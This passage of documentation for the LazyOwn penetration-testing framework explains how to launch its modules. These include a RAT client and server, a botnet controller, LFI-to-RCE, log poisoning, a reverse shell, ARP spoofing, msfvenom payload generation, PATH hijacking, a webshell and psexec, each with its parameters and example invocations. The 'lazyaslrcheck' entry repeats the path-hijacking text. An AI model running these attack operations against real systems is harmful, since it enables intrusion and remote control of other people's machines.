    `run_lazysearch_bot()`

Note:
    - Ensure that `modules/lazysearch_bot.py` has the appropriate permissions and dependencies to run.
    - The environment variable `GROQ_API_KEY` must be correctly set for the script to function.

## lazymetaextract0r
Run the Metadata extractor internal module located at `modules/lazyown_metaextract0r.py` with the specified parameters.

This function executes the script with the following arguments:

- `path`: The file path to be processed by the script, specified in `self.params`.

The function performs the following steps:

1. Retrieves the value for `path` from `self.params`.
2. Checks if the `path` parameter is set. If not, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazyown_metaextract0r.py` script with the appropriate argument.

:param path: The file path to be processed by the script.
:type path: str

:returns: None

Manual execution:
1. Ensure that `path` is set in `self.params`.
2. The script `modules/lazyown_metaextract0r.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazyown_metaextract0r.py --path <path>`

Example:
    To run `lazyown_metaextract0r` with `path` set to `/home/user/file.txt`, set:
    `self.params["path"] = "/home/user/file.txt"`
    Then call:
    `run_lazymetaextract0r()`

Note:
    - Ensure that `modules/lazyown_metaextract0r.py` has the appropriate permissions and dependencies to run.

## lazyownratcli
Run the internal module located at `modules/lazyownclient.py` with the specified parameters.

This function executes the script with the following arguments:

- `lhost`: The IP address of the local host, specified in `self.params`.
- `lport`: The port number of the local host, specified in `self.params`.
- `rat_key`: The RAT key, specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `lhost`, `lport`, and `rat_key` from `self.params`.
2. Checks if all required parameters (`lhost`, `lport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazyownclient.py` script with the appropriate arguments.

:param lhost: The IP address of the local host.
:type lhost: str
:param lport: The port number of the local host.
:type lport: int
:param rat_key: The RAT key.
:type rat_key: str

:returns: None

Manual execution:
1. Ensure that `lhost`, `lport`, and `rat_key` are set in `self.params`.
2. The script `modules/lazyownclient.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazyownclient.py --host <lhost> --port <lport> --key <rat_key>`

Example:
    To run `lazyownclient` with `lhost` set to `192.168.1.10`, `lport` set to `8080`, and `rat_key` set to `my_secret_key`, set:
    `self.params["lhost"] = "192.168.1.10"`
    `self.params["lport"] = 8080`
    `self.params["rat_key"] = "my_secret_key"`
    Then call:
    `run_lazyownratcli()`

Note:
    - Ensure that `modules/lazyownclient.py` has the appropriate permissions and dependencies to run.

## lazyownrat
Run the internal module located at `modules/lazyownserver.py` with the specified parameters.

This function executes the script with the following arguments:

- `rhost`: The IP address of the remote host, specified in `self.params`.
- `rport`: The port number of the remote host, specified in `self.params`.
- `rat_key`: The RAT key, specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `rhost`, `rport`, and `rat_key` from `self.params`.
2. Checks if all required parameters (`rhost`, `rport`, and `rat_key`) are set. If any are missing, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazyownserver.py` script with the appropriate arguments.

:param rhost: The IP address of the remote host.
:type rhost: str
:param rport: The port number of the remote host.
:type rport: int
:param rat_key: The RAT key.
:type rat_key: str

:returns: None

Manual execution:
1. Ensure that `rhost`, `rport`, and `rat_key` are set in `self.params`.
2. The script `modules/lazyownserver.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazyownserver.py --host <rhost> --port <rport> --key <rat_key>`

Example:
    To run `lazyownserver` with `rhost` set to `192.168.1.10`, `rport` set to `8080`, and `rat_key` set to `my_secret_key`, set:
    `self.params["rhost"] = "192.168.1.10"`
    `self.params["rport"] = 8080`
    `self.params["rat_key"] = "my_secret_key"`
    Then call:
    `run_lazyownrat()`

Note:
    - Ensure that `modules/lazyownserver.py` has the appropriate permissions and dependencies to run.

## lazybotnet
Run the internal module located at `modules/lazybotnet.py` with the specified parameters.

This function executes the script with the following arguments:

- `rhost`: The IP address of the remote host, hardcoded to "0.0.0.0".
- `rport`: The port number of the remote host, specified in `self.params`.
- `rat_key`: The RAT key, specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `rport` and `rat_key` from `self.params`. The `rhost` is hardcoded to "0.0.0.0".
2. Checks if all required parameters (`rport` and `rat_key`) are set. If any are missing, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazybotnet.py` script with the appropriate arguments.

:param rport: The port number of the remote host.
:type rport: int
:param rat_key: The RAT key.
:type rat_key: str

:returns: None

Manual execution:
1. Ensure that `rport` and `rat_key` are set in `self.params`.
2. The script `modules/lazybotnet.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazybotnet.py --host <rhost> --port <rport> --key <rat_key>`

Example:
    To run `lazybotnet` with `rport` set to `1234` and `rat_key` set to `my_key`, set:
    `self.params["rport"] = 1234`
    `self.params["rat_key"] = "my_key"`
    Then call:
    `run_lazybotnet()`

Note:
    - Ensure that `modules/lazybotnet.py` has the appropriate permissions and dependencies to run.

## lazylfi2rce
Run the internal module located at `modules/lazylfi2rce.py` with the specified parameters.

This function executes the script with the following arguments:

- `rhost`: The IP address of the remote host, specified in `self.params`.
- `rport`: The port number of the remote host, specified in `self.params`.
- `lhost`: The IP address of the local host, specified in `self.params`.
- `lport`: The port number of the local host, specified in `self.params`.
- `field`: The field name for the LFI (Local File Inclusion) attack, specified in `self.params`.
- `wordlist`: The path to the wordlist file used for the attack, specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` from `self.params`.
2. Checks if all required parameters are set. If any are missing, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazylfi2rce.py` script with the appropriate arguments.

:param rhost: The IP address of the remote host.
:type rhost: str
:param rport: The port number of the remote host.
:type rport: int
:param lhost: The IP address of the local host.
:type lhost: str
:param lport: The port number of the local host.
:type lport: int
:param field: The field name for the LFI attack.
:type field: str
:param wordlist: The path to the wordlist file.
:type wordlist: str

:returns: None

Manual execution:
1. Ensure that `rhost`, `rport`, `lhost`, `lport`, `field`, and `wordlist` are set in `self.params`.
2. The script `modules/lazylfi2rce.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazylfi2rce.py --rhost <rhost> --rport <rport> --lhost <lhost> --lport <lport> --field <field> --wordlist <wordlist>`

Example:
    To run the lazylfi2rce with `rhost` set to `192.168.1.1`, `rport` set to `80`, `lhost` set to `192.168.1.2`, `lport` set to `8080`, `field` set to `file`, and `wordlist` set to `path/to/wordlist.txt`, set:
    `self.params["rhost"] = "192.168.1.1"`
    `self.params["rport"] = 80`
    `self.params["lhost"] = "192.168.1.2"`
    `self.params["lport"] = 8080`
    `self.params["field"] = "file"`
    `self.params["wordlist"] = "path/to/wordlist.txt"`
    Then call:
    `run_lazylfi2rce()`

Note:
    - Ensure that `modules/lazylfi2rce.py` has the appropriate permissions and dependencies to run.

## lazylogpoisoning
Run the internal module located at `modules/lazylogpoisoning.py` with the specified parameters.

This function executes the script with the following arguments:

- `rhost`: The IP address of the remote host, specified in `self.params`.
- `lhost`: The IP address of the local host, specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `rhost` and `lhost` from `self.params`.
2. Checks if the required parameters `rhost` and `lhost` are set. If not, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazylogpoisoning.py` script with the appropriate arguments.

:param rhost: The IP address of the remote host. Must be set in `self.params`.
:type rhost: str
:param lhost: The IP address of the local host. Must be set in `self.params`.
:type lhost: str

:returns: None

Manual execution:
1. Ensure that `rhost` and `lhost` are set in `self.params`.
2. The script `modules/lazylogpoisoning.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazylogpoisoning.py --rhost <rhost> --lhost <lhost>`

Example:
    To run the lazylogpoisoning with `rhost` set to `192.168.1.1` and `lhost` set to `192.168.1.2`, set:
    `self.params["rhost"] = "192.168.1.1"`
    `self.params["lhost"] = "192.168.1.2"`
    Then call:
    `run_lazylogpoisoning()`

Note:
    - Ensure that `modules/lazylogpoisoning.py` has the appropriate permissions and dependencies to run.

## lazybotcli
Run the internal module located at `modules/lazybotcli.py` with the specified parameters.

This function executes the script with the following arguments:

- `rhost`: The IP address of the remote host (default is `"0.0.0.0"`).
- `rport`: The port number to be used, specified in `self.params`.
- `rat_key`: The key for the Remote Access Tool (RAT), specified in `self.params`.

The function performs the following steps:

1. Retrieves the values for `rport` and `rat_key` from `self.params`.
2. Checks if the required parameters `rport` and `rat_key` are set. If not, it prints an error message and returns.
3. Calls the `run_script` method to execute the `lazybotcli.py` script with the appropriate arguments.

:param rport: The port number for the connection. Must be set in `self.params`.
:type rport: int
:param rat_key: The key for the RAT. Must be set in `self.params`.
:type rat_key: str

:returns: None

Manual execution:
1. Ensure that `rport` and `rat_key` are set in `self.params`.
2. The script `modules/lazybotcli.py` should be present in the `modules` directory.
3. Run the script with:
    `python3 modules/lazybotcli.py --host 0.0.0.0 --port <rport> --key <rat_key>`

Example:
    To run the lazybotcli with port `12345` and key `mysecretkey`, set:
    `self.params["rport"] = 12345`
    `self.params["rat_key"] = "mysecretkey"`
    Then call:
    `run_lazybotcli()`

Note:
    - Ensure that `modules/lazybotcli.py` has the appropriate permissions and dependencies to run.

## lazyssh77enum
Run the internal module located at `modules/lazybrutesshuserenum.py` with the specified parameters. ONLY valid for 7.x Version !!!

The script will be executed with the following arguments:

- `wordlist`: The path to the wordlist file containing potential usernames for SSH enumeration.
- `rhost`: The target IP address or hostname for SSH enumeration.

The function performs the following steps:

1. Retrieves the values for `wordlist` and `rhost` from `self.params`.
2. Prints a warning message about the potential inaccuracy of the results.
3. Constructs the command to run the `lazybrutesshuserenum.sh` script with the specified arguments.
4. Executes the command using the `os.system` method.

:param wordlist: The path to the wordlist file for username enumeration. Must be set in `self.params`.
:type wordlist: str
:param rhost: The target IP address or hostname for SSH enumeration. Must be set in `self.params`.
:type rhost: str

:returns: None

Manual execution:
1. Ensure that `wordlist` and `rhost` are set in `self.params`.
2. Run the script `modules/lazybrutesshuserenum.sh` with the appropriate arguments.

Dependencies:
- `modules/lazybrutesshuserenum.sh` must be present in the `modules` directory and must be executable.

Example:
    To run the SSH user enumeration with a wordlist located at `/path/to/wordlist.txt` and target IP `192.168.1.1`, set:
    `self.params["usrwordlist"] = "/path/to/wordlist.txt"`
    `self.params["rhost"] = "192.168.1.1"`
    Then call:
    `run_lazyssh77enum()`

Note:
    - The accuracy of the results may vary depending on the version of the script and the wordlist used.

## lazyburpfuzzer
Run the internal module located at `modules/lazyown_burpfuzzer.py` with the specified parameters.

The script will be executed with the following arguments:

- `--url`: The target URL for the fuzzer.
- `--method`: The HTTP method to use (e.g., GET, POST).
- `--proxy_port`: The port for the proxy server.
- `--headers`: Optional HTTP headers to include in the request.
- `--data`: Optional data to include in the request body.
- `--params`: Optional URL parameters to include in the request.
- `--json_data`: Optional JSON data to include in the request body.
- `-w`: Optional wordlist for fuzzing.
- `-hc`: Optional hide code for fuzzing.

The function performs the following steps:

1. Retrieves the values for `url`, `method`, `headers`, `params`, `data`, `json_data`, `proxy_port`, `wordlist`, and `hide_code` from `self.params`.
2. Constructs the command to run the `lazyown_burpfuzzer.py` script with the specified arguments.
3. Adds optional parameters based on whether the corresponding files (`headers_file`, `data_file`, `params_file`, `json_data_file`) are provided.
4. Executes the command using the `run_command` method.

:param url: The target URL for the fuzzer. Must be set in `self.params`.
:type url: str
:param method: The HTTP method to use. Must be set in `self.params`.
:type method: str
:param headers: Optional HTTP headers. Must be set in `self.params` or provided via `headers_file`.
:type headers: str
:param params: Optional URL parameters. Must be set in `self.params` or provided via `params_file`.
:type params: str
:param data: Optional data for the request body. Must be set in `self.params` or provided via `data_file`.
:type data: str
:param json_data: Optional JSON data for the request body. Must be set in `self.params` or provided via `json_data_file`.
:type json_data: str
:param proxy_port: The port for the proxy server. Must be set in `self.params`.
:type proxy_port: int
:param wordlist: Optional wordlist for fuzzing. Must be set in `self.params`.
:type wordlist: str
:param hide_code: Optional code to hide. Must be set in `self.params`.
:type hide_code: int
:param headers_file: Optional file containing headers.
:type headers_file: str, optional
:param data_file: Optional file containing data.
:type data_file: str, optional
:param params_file: Optional file containing parameters.
:type params_file: str, optional
:param json_data_file: Optional file containing JSON data.
:type json_data_file: str, optional

:returns: None

Manual execution:
1. Ensure that `url`, `method`, and `proxy_port` are set in `self.params`.
2. Provide additional parameters as needed.
3. Run the script `modules/lazyown_burpfuzzer.py` with the appropriate arguments.

Dependencies:
- `modules/lazyown_burpfuzzer.py` must be present in the `modules` directory and must be executable.

Example:
    To run the fuzzer with URL `http://example.com`, HTTP method `POST`, and proxy port `8080`, set:
    `self.params["url"] = "http://example.com"`
    `self.params["method"] = "POST"`
    `self.params["proxy_port"] = 8080`
    Then call:
    `run_lazyburpfuzzer()`

Note:
    - Ensure that all required parameters are set before calling this function.
    - Parameters can also be provided via corresponding files.

## lazyreverse_shell
Run the internal module located at `modules/lazyreverse_shell.sh` with the specified parameters.

The script will be executed with the following arguments:
- `--ip`: The IP address to use for the reverse shell.
- `--puerto`: The port to use for the reverse shell.

The function performs the following steps:

1. Retrieves the values for `rhost` (IP address) and `reverse_shell_port` (port) from `self.params`.
2. Validates that `rhost` and `reverse_shell_port` parameters are set.
3. Constructs the command to run the `lazyreverse_shell.sh` script with the specified arguments.
4. Executes the command.

:param ip: The IP address to use for the reverse shell. Must be set in `self.params`.
:type ip: str
:param port: The port to use for the reverse shell. Must be set in `self.params`.
:type port: str

:returns: None

Manual execution:
1. Ensure that `rhost` and `reverse_shell_port` are set in `self.params`.
2. Run the script `modules/lazyreverse_shell.sh` with the appropriate arguments.

Dependencies:
- `modules/lazyreverse_shell.sh` must be present in the `modules` directory and must be executable.

Example:
    To set up a reverse shell with IP `192.168.1.100` and port `4444`, set:
    `self.params["rhost"] = "192.168.1.100"`
    `self.params["reverse_shell_port"] = "4444"`
    Then call:
    `run_lazyreverse_shell()`

Note:
    - Ensure that `modules/lazyreverse_shell.sh` has the necessary permissions to execute.
    - Parameters must be set before calling this function.

## lazyarpspoofing
Run the internal module located at `modules/lazyarpspoofing.py` with the specified parameters.

The script will be executed with the following arguments:
- `--device`: The network interface to use for ARP spoofing.
- `lhost`: The local host IP address to spoof.
- `rhost`: The remote host IP address to spoof.

The function performs the following steps:

1. Retrieves the values for `lhost`, `rhost`, and `device` from `self.params`.
2. Validates that `lhost`, `rhost`, and `device` parameters are set.
3. Constructs the command to run the `lazyarpspoofing.py` script with the specified arguments.
4. Executes the command.

:param lhost: The local host IP address to spoof. Must be set in `self.params`.
:type lhost: str
:param rhost: The remote host IP address to spoof. Must be set in `self.params`.
:type rhost: str
:param device: The network interface to use for ARP spoofing. Must be set in `self.params`.
:type device: str

:returns: None

Manual execution:
1. Ensure that `lhost`, `rhost`, and `device` are set in `self.params`.
2. Run the script `modules/lazyarpspoofing.py` with the appropriate arguments.

Dependencies:
- `modules/lazyarpspoofing.py` must be present in the `modules` directory and must be executable.

Example:
    To execute ARP spoofing with local host `192.168.1.2`, remote host `192.168.1.1`, and device `eth0`, set:
    `self.params["lhost"] = "192.168.1.2"`
    `self.params["rhost"] = "192.168.1.1"`
    `self.params["device"] = "eth0"`
    Then call:
    `run_lazyarpspoofing()`

Note:
    - Ensure that `modules/lazyarpspoofing.py` has the necessary permissions to execute.
    - Parameters must be set before calling this function.

## lazyattack
Run the internal module located at `modules/lazyatack.sh` with the specified parameters.

The script will be executed with the following arguments:
- `--modo`: The mode of the attack.
- `--ip`: The target IP address.
- `--atacante`: The attacker IP address.

The function performs the following steps:

1. Retrieves the current working directory.
2. Validates that `mode`, `rhost`, and `lhost` parameters are set.
3. Constructs the command to run the `lazyatack.sh` script with the specified arguments.
4. Executes the command.

:param mode: The mode in which the attack should be run. Must be set in `self.params`.
:type mode: str
:param target_ip: The IP address of the target. Must be set in `self.params`.
:type target_ip: str
:param attacker_ip: The IP address of the attacker. Must be set in `self.params`.
:type attacker_ip: str

:returns: None

Manual execution:
1. Ensure that `mode`, `rhost`, and `lhost` are set in `self.params`.
2. Run the script `modules/lazyatack.sh` with the appropriate arguments.

Dependencies:
- `modules/lazyatack.sh` must be present in the `modules` directory and must be executable.

Example:
    To execute the attack with mode `scan`, target IP `192.168.1.100`, and attacker IP `192.168.1.1`, set:
    `self.params["mode"] = "scan"`
    `self.params["rhost"] = "192.168.1.100"`
    `self.params["lhost"] = "192.168.1.1"`
    Then call:
    `run_lazyattack()`

Note:
    - Ensure that `modules/lazyatack.sh` has the necessary permissions to execute.
    - Parameters must be set before calling this function.

## lazymsfvenom
Executes the `msfvenom` tool to generate a variety of payloads based on user input.

This function prompts the user to select a payload type from a predefined list and runs the corresponding
`msfvenom` command to create the desired payload. It handles tasks such as generating different types of
payloads for Linux, Windows, macOS, and Android systems, including optional encoding with Shikata Ga Nai for C payloads.

The generated payloads are moved to a `sessions` directory, where appropriate permissions are set. Additionally,
the payloads can be compressed using UPX for space efficiency. If the selected payload is an Android APK,
the function will also sign the APK and perform necessary post-processing steps.

:param line: Command line arguments for the script.
:return: None

## lazyaslrcheck
Creates a path hijacking attack by performing the following steps:

1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
3. Sets executable permissions on the copied script.
4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

:param binary_name: The name of the binary to be used in the path hijacking attack. It should be set in `self.params` before calling this method.
:type binary_name: str

:returns: None

Manual execution:
1. Ensure that `binary_name` is set in `self.params`.
2. Append the binary name to `modules/tmp.sh`.
3. Copy `modules/tmp.sh` to `/tmp/{binary_name}`.
4. Set executable permissions on the copied file.
5. Update the PATH environment variable to prioritize `/tmp`.

Dependencies:
- The `self.params` dictionary must contain a valid `binary_name`.
- Ensure that `modules/tmp.sh` exists and contains appropriate content for the attack.

Example:
    To execute the path hijacking attack with `binary_name` as `malicious`, ensure `self.params["binary_name"]` is set to `"malicious"`, and then call:
    `run_lazypathhijacking()`

Note:
    - The `binary_name` parameter must be a string representing the name of the binary to hijack.
    - The method modifies the PATH environment variable, which may affect the execution of other binaries.

## lazypathhijacking
Creates a path hijacking attack by performing the following steps:

1. Appends the value of `binary_name` to a temporary script located at `modules/tmp.sh`.
2. Copies this temporary script to `/tmp` with the name specified by `binary_name`.
3. Sets executable permissions on the copied script.
4. Prepends `/tmp` to the system's PATH environment variable to ensure the script is executed in preference to other binaries.

The function then prints out each command being executed and a message indicating the binary name used for the path hijacking.

:param binary_name: The name of the binary to be used in the path hijacking attack.
:returns: None

## script
Run a script with the given arguments

This method constructs and executes a command to run a Python script with the specified arguments. It uses the `run_command` method to execute the script and handle real-time output.

:param script_name: The name of the script to be executed.
:type script_name: str
:param args: The arguments to be passed to the script.
:type args: tuple of str

:returns: None

Manual execution:
1. Build the command list with "python3", the script name, and the arguments.
2. Call `run_command` with the constructed command list.

Dependencies:
- `run_command` method for executing the constructed command and streaming output.

Example:
    To execute a script named `example.py` with arguments `arg1` and `arg2`, call:
    `run_script("example.py", "arg1", "arg2")`

Note:
    - The `script_name` parameter should be a string representing the name of the script.
    - The `args` parameter is a variable-length argument list containing the arguments to be passed to the script.
    - Ensure that the script and arguments are properly specified.

## command
Run a command and print output in real-time

This method executes a given command using `subprocess.Popen` and streams both the standard output and standard error to the console in real-time. The output from both streams is appended to the `self.output` attribute. If interrupted, the process is terminated gracefully.

:param command: The command to be executed.
:type command: str

:returns: None

Manual execution:
1. Execute the command specified by the `command` parameter.
2. Stream and print the command's standard output and error to the console in real-time.
3. Append all output to the `self.output` attribute.
4. Handle `KeyboardInterrupt` by terminating the process and printing an error message.

Dependencies:
- `subprocess` module for running the command and capturing output.
- `print_msg` function for printing output to the console.
- `print_error` function for printing error messages to the console.

Example:
    To execute a command, call `run_command("ls -l")`.

Note:
    - The `command` parameter should be a string representing the command to be executed.
    - `self.output` must be initialized before calling this method.
    - Ensure proper exception handling to manage process interruptions.

## payload
Load parameters from a specified payload JSON file.

This function loads parameters from a JSON file specified by the `line` argument and updates the instance's `params` dictionary with the values from the file. If the file does not exist or contains invalid JSON, it will print an appropriate error message.

Usage:
    payload <filename>

:param line: The name of the JSON file to load.
:type line: str

:returns: None

Manual execution:
1. Open and read the specified JSON file.
2. Update the `params` dictionary with values from the JSON file.
3. Print a success message if the parameters were successfully loaded.
4. Handle `FileNotFoundError` if the file does not exist.
5. Handle `JSONDecodeError` if there is an error decoding the JSON file.

Dependencies:
- `json` module for reading and parsing the JSON file.

Example:
    To execute the function, call `payload payload_10.10.10.10.json`.

Note:
    - Ensure that the specified JSON file exists in the current directory and is properly formatted.
    - The confirmation message includes color formatting for better visibility.

## exit
Exit the command line interface.

This function prompts the user to confirm whether they want to exit the command line interface. If confirmed, it will terminate the program. Otherwise, it will cancel the exit.

Usage:
    exit

:param arg: This parameter is not used in this function.
:type arg: str

:returns: None

Manual execution:
1. Prompt the user with a confirmation message to exit the CLI.
2. If the user confirms with 's', print a message and exit the program.
3. If the user provides any other input, print a cancellation message and remain in the CLI.

Dependencies:
- `sys.exit` function for exiting the program.

Example:
    To execute the function, simply call `exit`.

Note:
    - The confirmation prompt is in Spanish.
    - Ensure that `sys` is imported in your script.

## fixperm
Fix permissions for LazyOwn shell scripts.

This function adjusts the file permissions for shell scripts and CGI scripts in the `modules` directory, making them executable.

Usage:
    fixperm

:param line: This parameter is not used in this function.
:type line: str

:returns: None

Manual execution:
1. Change the permissions of all shell scripts in the `modules` directory to be executable.
2. Change the permissions of all files in the `modules/cgi-bin` directory to be executable.

Dependencies:
- `chmod` command must be available on the system.

Example:
    To execute the function, simply call `fixperm`.

Note:
    - Ensure you have the necessary permissions to modify file permissions.

## lazywebshell
Run LazyOwn webshell server.

This function starts a web server that serves the `lazywebshell.py` script from the `modules` directory on port 8888. The server is run in the background.

Usage:
    lazywebshell

:param line: This parameter is not used in this function.
:type line: str

:returns: None

Manual execution:
1. Start a Python HTTP server with CGI support on port 8888.
2. The server serves files from the `modules` directory.

Dependencies:
- Python 3.x must be installed on the system.
- The `http.server` module should be available.

Example:
    To execute the function, simply call `lazywebshell`.

Note:
    - The server runs in the background, and the output will not be displayed in the terminal.

## getcap
Retrieve and display file capabilities on the system.

This function uses the `getcap` command to recursively list capabilities for files starting from the root directory (`/`). The output is filtered to suppress error messages.

Usage:
    getcap

:param line: This parameter is not used in this function.
:type line: str

:returns: None

Manual execution:
1. Run the `getcap -r /` command to list file capabilities recursively from the root directory.
2. Redirect standard error to `/dev/null` to suppress error messages.
3. Copy to clipboard the command to appy in the victim machine. 
Dependencies:
- `getcap` must be installed on the system.

Example:
    To execute the function, simply call `do_getcap`.

Note:
    - The command may require elevated permissions to access certain directories and files.

## getseclist
Get the SecLists wordlist from GitHub.

This function downloads and extracts the SecLists wordlist from GitHub to the `/usr/share/wordlists/` directory.

Usage:
    getseclist

:param line: This parameter is not used in this function.
:type line: str

:returns: None

Manual execution:
1. Navigate to the `/usr/share/wordlists/` directory.
2. Download the SecLists repository using `wget`.
3. Extract the downloaded ZIP file.
4. Remove the ZIP file after extraction.

Dependencies:
- `wget` must be installed on the system.
- `unzip` must be installed on the system.
- `sudo` must be available for downloading and extracting files.

Example:
    To execute the function, simply call `getseclist`.

Note:
    - Ensure that you have the necessary permissions to write to the `/usr/share/wordlists/` directory.
    - If `wget` or `unzip` is not installed, the function will fail.

## smbclient
Interacts with SMB shares using the `smbclient` command to perform the following operations:

1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
2. If `line` (share name) is provided:
- Attempts to access the specified SMB share on the remote host using the command: `smbclient -N \\{rhost}\{line}`
3. If `line` is not provided:
- Lists available SMB shares on the remote host with the command: `smbclient -N -L \\{rhost}`
4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

:param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
:returns: None

## smbclient_py
Interacts with SMB shares using the `smbclient.py` command to perform the following operations:

1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
2. If `line` (share name) is provided:
- Attempts to access the specified SMB share on the remote host using the command: `smbclient.py -N \\{rhost}\{line}`
3. If `line` is not provided:
- Lists available SMB shares on the remote host with the command: `smbclient.py -N -L \\{rhost}`
4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/share" /mnt/smb`

:param line: The name of the SMB share to access on the remote host. If not provided, the function will list all available shares.
:returns: None

## smbmap
smbmap -H 10.10.10.3 [OPTIONS]
Uses the `smbmap` tool to interact with SMB shares on a remote host:

1. Checks if `rhost` (remote host) and `lhost` (local host) are set; if not, an error message is displayed.
2. If no `line` (share name or options) is provided:
- Attempts to access SMB shares on the remote host with a default user `deefbeef` using the command: `smbmap -H {rhost} -u 'deefbeef'`
3. If `line` is provided:
- Executes `smbmap` with the specified options or share name using the command: `smbmap -H {rhost} -R {line}`
4. Suggests a potential SMB exploit if possible by mounting the share from the local host using: `mount -t cifs "//{lhost}/documents" /mnt/smb`

:param line: Options or share name to use with `smbmap`. If not provided, uses a default user to list shares.
:returns: None

## getnpusers
sudo impacket-GetNPUsers mist.htb/ -no-pass -usersfile sessions/users.txt
Executes the `impacket-GetNPUsers` command to enumerate users with Kerberos pre-authentication disabled.

1. Checks if the `line` (domain) argument is provided; if not, an error message is displayed, instructing the user to provide a domain.
2. Executes `impacket-GetNPUsers` with the following options:
- `-no-pass`: Skips password prompt.
- `-usersfile sessions/users.txt`: Specifies the file containing the list of users to check.

:param line: The domain to query. Must be provided in the format `domain.com`. Example usage: `getnpusers domain.com`
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    sudo impacket-GetNPUsers <domain> -no-pass -usersfile sessions/users.txt
Replace `<domain>` with the actual domain name you want to query.

## psexec
Executes the Impacket PSExec tool to attempt remote execution on the specified target.

This function performs the following actions:
1. Checks if the provided target host (`rhost`) is valid.
2. If the `line` argument is "pass", it searches for credential files with the pattern `credentials*.txt`
and allows the user to select which file to use for executing the command.
3. If the `line` argument is not "pass", it assumes execution without a password (using the current credentials).
4. Copies the `rhost` IP address to the clipboard for ease of use.

Parameters:
line (str): A command argument to determine the action.
            If "pass", the function searches for credential files and authenticates using the selected file.
            Otherwise, it executes PSExec without a password using the `rhost` IP.

Returns:
None

## rpcdump
Executes the `rpcdump.py` script to dump RPC services from a target host.

1. Retrieves the target host IP from the `rhost` parameter.
2. Checks if the `rhost` parameter is valid using `check_rhost()`. If invalid, the function returns early.
3. Executes the `rpcdump.py` script on port 135 and 593 to gather RPC service information from the target host.

:param line: This parameter is not used in this command but is included for consistency with other methods.
:returns: None

Manual execution:
To manually run this command, use the following syntax:
    rpcdump.py -p 135 <target_host>
    rpcdump.py -p 593 <target_host>
Replace `<target_host>` with the IP address or hostname of the target machine.

## dig
Executes the `dig` command to query DNS information.

1. Retrieves the DNS server IP from the `line` parameter and the target host from the `rhost` parameter.
2. If either the DNS server or `rhost` is not provided, an error message is printed.
3. Executes the `dig` command to query the version of the DNS server and additional records.

:param line: DNS server IP or hostname. Must be provided for the `dig` command.
:param rhost: Target host for additional `dig` queries.

:returns: None

Manual execution:
To manually run these commands, use the following syntax:
    dig version.bind CHAOS TXT @<dns_server>
    dig any <domain> @<rhost>

Replace `<dns_server>` with the IP address or hostname of the DNS server, `<domain>` with the target domain, and `<rhost>` with the IP address or hostname of the target machine.

## cp
Copies a file from the ExploitDB directory to the sessions directory.

1. Retrieves the path to the ExploitDB directory and the target file from the `line` parameter.
2. Copies the specified file from the ExploitDB directory to the `sessions` directory in the current working directory.

:param line: The relative path to the file within the ExploitDB directory. For example, `java/remote/51884.py`.
:param exploitdb: The path to the ExploitDB directory. This must be set in advance or provided directly.

:returns: None

Manual execution:
To manually copy files, use the following syntax:
    cp <exploitdb_path><file_path> <destination_path>

Replace `<exploitdb_path>` with the path to your ExploitDB directory, `<file_path>` with the relative path to the file, and `<destination_path>` with the path where you want to copy the file.

For example:
    cp /usr/share/exploitdb/exploits/java/remote/51884.py /path/to/sessions/

## dnsenum
Performs DNS enumeration using `dnsenum` to identify subdomains for a given domain.

1. Executes the `dnsenum` command with parameters to specify the DNS server, output file, and wordlist for enumeration.

:param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
:param rhost: The DNS server to use for enumeration, e.g., `10.10.11.24`.
:param dnswordlist: The path to the DNS wordlist file used for subdomain discovery.

:returns: None

Manual execution:
To manually perform DNS enumeration, use the following command:
    dnsenum --dnsserver <dns_server> --enum -p 0 -s 0 -o <output_file> -f <dns_wordlist> <target_domain>

Replace `<dns_server>` with the DNS server IP, `<output_file>` with the file path to save the results, `<dns_wordlist>` with the path to your DNS wordlist file, and `<target_domain>` with the domain to be enumerated.

For example:
    dnsenum --dnsserver 10.10.11.24 --enum -p 0 -s 0 -o sessions/subdomains.txt -f /path/to/dnswordlist.txt ghost.htb

## dnsmap
Performs DNS enumeration using `dnsmap` to discover subdomains for a specified domain.

1. Executes the `dnsmap` command to scan the given domain with a specified wordlist.

:param line: The target domain to perform DNS enumeration on, e.g., `ghost.htb`.
:param dnswordlist: The path to the wordlist file used for DNS enumeration.

:returns: None

Manual execution:
To manually perform DNS enumeration, use the following command:
    dnsmap <target_domain> -w <dns_wordlist>

Replace `<target_domain>` with the domain you want to scan and `<dns_wordlist>` with the path to your DNS wordlist file.

For example:
    dnsmap ghost.htb -w /path/to/dnswordlist.txt

## whatweb
Performs a web technology fingerprinting scan using `whatweb`.

1. Executes the `whatweb` command to identify technologies used by the target web application.

:param line: This parameter is not used in the current implementation but could be used to pass additional options or arguments if needed.
:param rhost: The target web host to be scanned, specified in the `params` dictionary.

:returns: None

Manual execution:
To manually perform web technology fingerprinting, use the following command:
    whatweb <target_host>

Replace `<target_host>` with the URL or IP address of the web application you want to scan.

